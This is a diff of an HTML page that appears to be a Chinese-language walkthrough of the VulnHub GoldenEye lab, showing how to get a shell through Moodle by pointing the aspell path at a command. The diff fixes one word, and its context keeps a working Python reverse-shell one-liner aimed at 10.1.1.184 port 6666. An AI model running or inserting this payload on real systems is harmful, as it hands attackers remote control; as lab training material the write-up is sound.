@@ -277,7 +277,7 @@
 <h2 id="方式二：手动触发"><a href="#方式二：手动触发" class="headerlink" title="方式二：手动触发"></a>方式二：手动触发</h2><p>​	手动发出同样需要修改Shell engine。</p>
 <h3 id="Page-to-aspell"><a href="#Page-to-aspell" class="headerlink" title="Page to aspell"></a>Page to aspell</h3><p><code>Home - Site administration - Server - System paths</code></p>
 <p><img src="/2022/08/02/vulnhub-goldeneye/image-20220807111832218.png" alt="image-20220807111832218"></p>
-<p>​	在此处修改为pythonfantanshell的代码。</p>
+<p>​	在此处修改为python反弹shell的代码。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.1.1.184&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
 
 <h3 id="Toggle-spellchecher"><a href="#Toggle-spellchecher" class="headerlink" title="Toggle spellchecher"></a>Toggle spellchecher</h3><p><code>Home - My profile - Blogs - Add a new entry</code></p>
